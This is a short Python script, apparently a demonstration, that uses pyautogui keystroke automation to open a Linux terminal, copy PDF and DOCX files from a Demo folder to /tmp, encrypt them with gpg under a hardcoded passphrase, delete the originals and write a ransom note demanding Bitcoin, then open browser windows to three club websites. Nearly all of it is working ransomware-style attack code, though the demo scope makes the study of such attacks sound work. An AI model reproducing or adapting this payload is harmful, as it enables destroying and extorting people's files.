import pyautogui
import time
import os

def execute_linux_payload():
    # Open terminal (Ctrl+Alt+T)
    pyautogui.hotkey('ctrl', 'alt', 't')
    time.sleep(1)

    # pyautogui.hotkey('fn', 'f11')
    # time.sleep(1)
    for _ in range(4):
        pyautogui.hotkey('ctrl', 'shift', '+')
        time.sleep(0.1)


    # Copy .docx and .pdf files to /tmp/
    pyautogui.write('cp ~/Demo/*.pdf /tmp/ && cp ~/Demo/*.docx /tmp/')
    pyautogui.press('enter')
    time.sleep(1)

    # Encrypt files using gpg with a symmetric password
    pyautogui.write("gpg --batch --yes --passphrase 'SuperSecretPassword123' -c /tmp/*.docx && gpg --batch --yes --passphrase 'SuperSecretPassword123' -c /tmp/*.pdf")
    pyautogui.press('enter')
    time.sleep(1)

    # Remove original files
    pyautogui.write("rm /tmp/*.docx /tmp/*.pdf")
    pyautogui.press('enter')
    time.sleep(1)

    # Create ransom note
    pyautogui.write("echo 'Your files have been encrypted! To decrypt them, send $100 in Bitcoin to the following address: 1BitcoinAddressHere. Use the passphrase: SuperSecretPassword123' > /tmp/RANSOM_NOTE.txt")
    pyautogui.press('enter')
    time.sleep(1)

    # Open terminal (Ctrl+Alt+T)
    pyautogui.hotkey('ctrl', 'alt', 't')
    time.sleep(1)

    pyautogui.write("ls -al /tmp/ | grep gpg")
    pyautogui.press('enter')
    time.sleep(1)

    pyautogui.hotkey('alt', 'tab')
    time.sleep(2)

    pyautogui.hotkey('alt', 'f4')
    time.sleep(1)

    pyautogui.write("firefox --new-window https://cryptonite.live/ --new-window https://projectmanas.in/ --new-window https://wearemist.in/")
    pyautogui.press('enter')
    time.sleep(4)

    pyautogui.hotkey('win', 'right')
    time.sleep(1)

    pyautogui.hotkey('alt', 'tab')
    time.sleep(1)

    pyautogui.hotkey('win', 'left')
    time.sleep(1)

    pyautogui.keyDown('alt')  
    pyautogui.press('tab')   
    time.sleep(0.2)           
    pyautogui.press('tab')   
    pyautogui.keyUp('alt')    
    pyautogui.hotkey('win', 'up')
    time.sleep(1)


# Delay to give you time to stop the script if needed
time.sleep(5)

# Execute the payload
execute_linux_payload()
